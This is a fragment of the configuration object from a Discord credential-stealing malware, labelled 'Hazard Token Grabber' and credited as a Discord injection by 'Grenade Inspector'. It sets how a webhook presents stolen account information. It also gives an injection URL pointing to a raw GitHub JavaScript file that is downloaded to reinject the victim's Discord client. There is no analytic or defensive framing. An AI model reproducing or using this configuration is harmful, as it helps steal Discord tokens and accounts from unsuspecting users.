...
const config = {
  ...
  embed_name: 'Hazard Token Grabber', //name of the webhook thats gonna send the info
  embed_icon: 'https://cdn.discordapp.com/attachments/1087214165078315079/1087214199735861248/hazard.png?size=4096'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
  embed_color: 16753920, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
  injection_url: 'https://raw.githubusercontent.com/BasedAndReal/Injection.js/main/injection.js', //injection url for when it reinjects
  /**
    ...
    embeds: [
      {
        ...
        footer: {
          text: '🎉・Discord Injection By Grenade Inspector・discord.gg/detroitthrowers',
        },
      },
    ],
  };
